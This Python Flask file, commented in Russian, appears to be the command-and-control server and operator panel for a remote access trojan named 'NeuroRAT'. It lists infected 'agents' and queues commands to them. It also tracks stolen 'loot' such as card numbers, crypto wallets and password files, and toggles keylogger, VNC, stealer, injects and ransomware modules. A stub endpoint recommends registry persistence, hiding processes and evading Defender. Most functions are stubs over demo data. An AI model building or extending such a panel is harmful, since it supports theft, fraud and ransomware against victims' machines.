#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import json
import logging
import datetime
import random
from flask import Flask, render_template, request, jsonify, redirect, url_for, send_from_directory, session

# Добавляем пути для импорта модулей
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'core'))
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'server'))

# Пытаемся импортировать модули NeuroZond если они доступны
try:
    neurozond_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'neurozond')
    if neurozond_path not in sys.path:
        sys.path.append(neurozond_path)
    has_neurozond = True
    logging.info("NeuroZond модули найдены и готовы к использованию")
except ImportError:
    has_neurozond = False
    logging.warning("NeuroZond модули не найдены, будет использована демо-версия интерфейса")

# Настройка логирования
if not os.path.exists('logs'):
    os.makedirs('logs')
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/server.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Определяем путь к UI
FRONTEND_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'neurorat-ui/dist')
STATIC_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
TEMPLATES_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')

app = Flask(__name__, 
            static_folder=STATIC_PATH, 
            static_url_path='/static',
            template_folder=TEMPLATES_PATH)

# Секретный ключ для сессий
app.secret_key = os.urandom(24)

# Глобальные данные (используются до подключения к базе данных)
# В реальном приложении эти данные будут в базе данных
agents_data = [
    {
        'agent_id': 'agent-1',
        'os': 'Linux',
        'hostname': 'server-demo-01',
        'username': 'admin',
        'ip_address': '192.168.1.100',
        'status': 'active',
        'last_seen': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    },
    {
        'agent_id': 'agent-2',
        'os': 'Windows',
        'hostname': 'desktop-demo-02',
        'username': 'user',
        'ip_address': '192.168.1.101',
        'status': 'inactive',
        'last_seen': (datetime.datetime.now() - datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S")
    },
    {
        'agent_id': 'agent-3',
        'os': 'macOS',
        'hostname': 'macbook-demo-03',
        'username': 'developer',
        'ip_address': '192.168.1.102',
        'status': 'active',
        'last_seen': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    }
]

logs_data = [
    {
        'timestamp': int(datetime.datetime.now().timestamp()) - 3600,
        'agent_id': 'agent-1',
        'event_type': 'connection',
        'details': 'Агент подключился к серверу C1'
    },
    {
        'timestamp': int(datetime.datetime.now().timestamp()) - 1800,
        'agent_id': 'agent-1',
        'event_type': 'command',
        'details': 'Запрос системной информации'
    },
    {
        'timestamp': int(datetime.datetime.now().timestamp()) - 600,
        'agent_id': 'agent-3',
        'event_type': 'connection',
        'details': 'Агент подключился к серверу C1'
    }
]

files_data = [
    {
        'file_id': 'file-1',
        'name': 'passwords.txt',
        'agent_id': 'agent-1',
        'size': '2.4 KB',
        'category': 'credentials',
        'timestamp': int(datetime.datetime.now().timestamp()) - 1200
    },
    {
        'file_id': 'file-2',
        'name': 'screenshot_001.png',
        'agent_id': 'agent-1',
        'size': '145 KB',
        'category': 'screenshot',
        'timestamp': int(datetime.datetime.now().timestamp()) - 600
    },
    {
        'file_id': 'file-3',
        'name': 'system_info.json',
        'agent_id': 'agent-3',
        'size': '5.1 KB',
        'category': 'system',
        'timestamp': int(datetime.datetime.now().timestamp()) - 300
    }
]

loot_data = [
    {
        'type': 'card',
        'value': '41XX XXXX XXXX X123',
        'agent_id': 'agent-1',
        'timestamp': int(datetime.datetime.now().timestamp()) - 1800,
        'tags': 'visa, личная',
        'notes': 'Найдена в браузере Chrome'
    },
    {
        'type': 'wallet',
        'value': '0x1a2b3c4d5e6f...',
        'agent_id': 'agent-2',
        'timestamp': int(datetime.datetime.now().timestamp()) - 3600,
        'tags': 'eth, metamask',
        'notes': 'Найден в кэше браузера'
    }
]

# Эмуляция интеграции с zonds
zonds_data = [
    {
        'id': 'zond-1',
        'name': 'Test Zond 1',
        'status': 'ACTIVE',
        'ipAddress': '192.168.1.100',
        'os': 'Linux',
        'lastSeen': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    },
    {
        'id': 'zond-2',
        'name': 'Test Zond 2',
        'status': 'INACTIVE',
        'ipAddress': '192.168.1.101',
        'os': 'Windows',
        'lastSeen': (datetime.datetime.now() - datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S")
    }
]

tasks_data = [
    {
        'id': 'task-1',
        'zondId': 'zond-1',
        'command': 'scan_network',
        'status': 'COMPLETED',
        'createdAt': (datetime.datetime.now() - datetime.timedelta(minutes=30)).strftime("%Y-%m-%dT%H:%M:%S"),
        'completedAt': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    },
    {
        'id': 'task-2',
        'zondId': 'zond-2',
        'command': 'gather_credentials',
        'status': 'PENDING',
        'createdAt': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
        'completedAt': None
    }
]

# Функция проверки авторизации (заглушка)
def check_auth():
    if 'logged_in' in session and session['logged_in']:
        return True
    return False

@app.route('/')
def index():
    # Если есть UI, отдаем его
    if os.path.exists(os.path.join(STATIC_PATH, 'index.html')):
        return redirect('/static/index.html')
    # Иначе отдаем простой шаблон
    return render_template('index.html')

@app.route('/admin')
def admin():
    if not check_auth():
        return redirect(url_for('login'))
    # Если есть UI, отдаем его админку
    if os.path.exists(os.path.join(STATIC_PATH, 'index.html')):
        return redirect('/static/index.html#/admin')
    # Иначе отдаем шаблон админки
    
    # Подготовим данные для шаблона
    metrics = {
        'total_agents': len(agents_data),
        'active_agents': len([a for a in agents_data if a['status'] == 'active']),
        'total_logs': len(logs_data),
        'total_files': len(files_data)
    }
    
    return render_template('dashboard_advanced.html', agents=agents_data, logs=logs_data, files=files_data, metrics=metrics)

@app.route('/neurorat')
def neurorat_panel():
    if not check_auth():
        return redirect(url_for('login'))
    
    # Подготовим данные для шаблона
    metrics = {
        'total_agents': len(agents_data),
        'active_agents': len([a for a in agents_data if a['status'] == 'active']),
        'total_logs': len(logs_data),
        'total_files': len(files_data)
    }
    
    return render_template('Neurorat_panel.html', agents=agents_data, logs=logs_data, files=files_data, metrics=metrics)

@app.route('/assets/<path:path>')
def serve_assets(path):
    return send_from_directory(os.path.join(FRONTEND_PATH, 'assets'), path)

@app.route('/api/status')
def status():
    return jsonify({
        'status': 'ok', 
        'version': '1.0.0',
        'uptime': '3 hours 12 minutes',
        'connected_zonds': len([z for z in zonds_data if z['status'] == 'ACTIVE']),
        'total_zonds': len(zonds_data),
        'tasks_pending': len([t for t in tasks_data if t['status'] == 'PENDING']),
        'tasks_total': len(tasks_data)
    })

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        # Заглушка для аутентификации
        if username == 'admin' and password == 'admin':
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('admin'))
        else:
            error = 'Неверные учетные данные'
            return render_template('login.html', error=error)
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    session.pop('username', None)
    return redirect(url_for('login'))

@app.route('/api/login', methods=['POST'])
def api_login():
    data = request.json
    username = data.get('username')
    password = data.get('password')
    
    # Заглушка для аутентификации
    if username == 'admin' and password == 'admin':
        return jsonify({'status': 'success', 'token': 'dummy_token'})
    return jsonify({'status': 'error', 'message': 'Invalid credentials'}), 401

@app.route('/api/zonds')
def get_zonds():
    return jsonify(zonds_data)

@app.route('/api/zonds/<zond_id>')
def get_zond(zond_id):
    for zond in zonds_data:
        if zond['id'] == zond_id:
            return jsonify(zond)
    return jsonify({'error': 'Zond not found'}), 404

@app.route('/api/tasks')
def get_tasks():
    return jsonify(tasks_data)

@app.route('/api/tasks/<task_id>')
def get_task(task_id):
    for task in tasks_data:
        if task['id'] == task_id:
            return jsonify(task)
    return jsonify({'error': 'Task not found'}), 404

@app.route('/api/zonds/<zond_id>/execute', methods=['POST'])
def execute_command(zond_id):
    data = request.json
    command = data.get('command')
    
    if not command:
        return jsonify({'error': 'Command is required'}), 400
    
    # Проверка существования зонда
    zond = None
    for z in zonds_data:
        if z['id'] == zond_id:
            zond = z
            break
    
    if not zond:
        return jsonify({'error': 'Zond not found'}), 404
    
    # Создаем новую задачу
    task_id = f'task-{len(tasks_data) + 1}'
    new_task = {
        'id': task_id,
        'zondId': zond_id,
        'command': command,
        'status': 'PENDING',
        'createdAt': datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
        'completedAt': None
    }
    
    tasks_data.append(new_task)
    
    # В реальном приложении здесь был бы код для отправки команды на зонд
    # и получения результатов асинхронно
    
    return jsonify({'status': 'success', 'taskId': task_id})

# Новые API-маршруты для поддержки dashboard_advanced.html

@app.route('/api/agents')
def get_agents():
    # Фильтрация по статусу и поиск по тексту
    status_filter = request.args.get('status', '')
    search_query = request.args.get('search', '').lower()
    
    filtered_agents = agents_data
    
    if status_filter:
        filtered_agents = [a for a in filtered_agents if a['status'] == status_filter]
    
    if search_query:
        filtered_agents = [a for a in filtered_agents if 
                          search_query in a['agent_id'].lower() or
                          search_query in a['hostname'].lower() or
                          search_query in a['username'].lower() or
                          search_query in a['ip_address'].lower()]
    
    return jsonify({'agents': filtered_agents})

@app.route('/api/logs')
def get_logs_api():
    # Фильтрация по типу и поиск по тексту
    type_filter = request.args.get('type', '')
    search_query = request.args.get('search', '').lower()
    
    filtered_logs = logs_data
    
    if type_filter:
        filtered_logs = [l for l in filtered_logs if l['event_type'] == type_filter]
    
    if search_query:
        filtered_logs = [l for l in filtered_logs if 
                        search_query in l['agent_id'].lower() or
                        search_query in l['event_type'].lower() or
                        search_query in l['details'].lower()]
    
    return jsonify({'logs': filtered_logs})

@app.route('/api/files')
def get_files():
    # Поиск по тексту
    search_query = request.args.get('search', '').lower()
    
    filtered_files = files_data
    
    if search_query:
        filtered_files = [f for f in filtered_files if 
                         search_query in f['name'].lower() or
                         search_query in f['agent_id'].lower() or
                         search_query in f['category'].lower()]
    
    return jsonify({'files': filtered_files})

@app.route('/api/files/upload', methods=['POST'])
def upload_file():
    # Заглушка для загрузки файлов
    if 'file' not in request.files:
        return jsonify({'error': 'No file part'}), 400
    
    file = request.files['file']
    agent_id = request.form.get('agent_id', 'manual')
    category = request.form.get('category', 'other')
    
    if file.filename == '':
        return jsonify({'error': 'No selected file'}), 400
    
    # В реальном приложении здесь был бы код для сохранения файла
    new_file = {
        'file_id': f'file-{len(files_data) + 1}',
        'name': file.filename,
        'agent_id': agent_id,
        'size': '10 KB',  # Заглушка
        'category': category,
        'timestamp': int(datetime.datetime.now().timestamp())
    }
    
    files_data.append(new_file)
    
    return jsonify({'status': 'success', 'file_id': new_file['file_id']})

@app.route('/api/files/download')
def download_file():
    file_id = request.args.get('file_id')
    
    # Заглушка для скачивания файлов
    for f in files_data:
        if f['file_id'] == file_id:
            # В реальном приложении здесь был бы код для отдачи файла
            return jsonify({'status': 'success', 'message': f'Downloading file {f["name"]}'})
    
    return jsonify({'error': 'File not found'}), 404

@app.route('/api/files/delete', methods=['POST'])
def delete_files():
    data = request.json
    file_ids = data.get('file_ids', [])
    
    # Заглушка для удаления файлов
    for file_id in file_ids:
        global files_data
        files_data = [f for f in files_data if f['file_id'] != file_id]
    
    return jsonify({'status': 'success'})

@app.route('/api/loot')
def get_loot():
    # Фильтрация по типу и поиск по тексту
    type_filter = request.args.get('type', '')
    search_query = request.args.get('search', '').lower()
    
    filtered_loot = loot_data
    
    if type_filter:
        filtered_loot = [l for l in filtered_loot if l['type'] == type_filter]
    
    if search_query:
        filtered_loot = [l for l in filtered_loot if 
                        search_query in l['value'].lower() or
                        search_query in l['agent_id'].lower() or
                        search_query in l['tags'].lower()]
    
    return jsonify({'loot': filtered_loot})

@app.route('/api/metrics')
def get_metrics():
    # Подготовка метрик для дашборда
    active_agents = len([a for a in agents_data if a['status'] == 'active'])
    total_agents = len(agents_data)
    
    # Категории файлов
    files_by_category = {}
    for f in files_data:
        cat = f['category']
        if cat not in files_by_category:
            files_by_category[cat] = 0
        files_by_category[cat] += 1
    
    # Топ агентов по количеству файлов
    agent_files = {}
    for f in files_data:
        agent_id = f['agent_id']
        if agent_id not in agent_files:
            agent_files[agent_id] = 0
        agent_files[agent_id] += 1
    
    top_agents = [{'agent_id': a, 'files': c} for a, c in agent_files.items()]
    top_agents.sort(key=lambda x: x['files'], reverse=True)
    top_agents = top_agents[:5]  # Топ 5
    
    # Демо-данные для модулей и атак
    modules_status = {
        'VNC': 'online' if random.random() > 0.3 else 'offline',
        'Keylogger': 'online' if random.random() > 0.3 else 'offline',
        'Screenshot': 'online' if random.random() > 0.3 else 'offline',
        'Injects': 'online' if random.random() > 0.3 else 'offline',
        'Stealer': 'online' if random.random() > 0.3 else 'offline'
    }
    
    active_attacks = [
        {'type': 'Lateral Movement', 'target': '192.168.1.5', 'status': 'running'},
        {'type': 'Brute Force', 'target': '192.168.1.10', 'status': 'completed'},
        {'type': 'Ransomware', 'target': '192.168.1.15', 'status': 'waiting'}
    ]
    
    return jsonify({
        'total_agents': total_agents,
        'active_agents': active_agents,
        'total_logs': len(logs_data),
        'total_files': len(files_data),
        'files_by_category': files_by_category,
        'top_agents': top_agents,
        'modules_status': modules_status,
        'active_attacks': active_attacks
    })

@app.route('/api/agent/<agent_id>/vnc', methods=['POST'])
def start_vnc(agent_id):
    # Заглушка для запуска VNC
    return jsonify({'status': 'success', 'message': f'VNC запущен для агента {agent_id}'})

@app.route('/api/agent/<agent_id>/screenshot', methods=['POST'])
def make_screenshot(agent_id):
    # Заглушка для создания скриншота
    return jsonify({'status': 'success', 'message': f'Скриншот создан для агента {agent_id}'})

@app.route('/api/agent/<agent_id>/reasoning', methods=['GET'])
def get_reasoning(agent_id):
    # Заглушка для получения рекомендаций по агенту
    reasoning = {
        'suggestions': [
            {'text': 'Запустить сканирование локальной сети', 'priority': 'high'},
            {'text': 'Собрать учетные данные браузера', 'priority': 'medium'},
            {'text': 'Настроить persistence через реестр', 'priority': 'high'},
            {'text': 'Скрыть процесс от TaskManager', 'priority': 'medium'}
        ],
        'analysis': "Агент находится в корпоративной сети. Обнаружены признаки наличия антивируса Defender. Возможно наличие доступа к другим узлам сети.",
        'recommendation': "Рекомендуется осторожное движение по сети с использованием легитимных инструментов администрирования, таких как PowerShell и WMI."
    }
    
    return jsonify(reasoning)

@app.route('/api/agent/<agent_id>/<module>', methods=['POST'])
def run_module(agent_id, module):
    # Заглушка для запуска модуля на агенте
    valid_modules = ['wallets', 'cookies', 'browser', 'system', 'keylogger', 'vnc', 'ats', 'lateral']
    
    if module not in valid_modules:
        return jsonify({'status': 'error', 'message': f'Неизвестный модуль: {module}'}), 400
    
    return jsonify({'status': 'success', 'message': f'Модуль {module} запущен на агенте {agent_id}'})

if __name__ == '__main__':
    logger.info("Starting server on port 8080...")
    app.run(host='0.0.0.0', port=8080, debug=True) 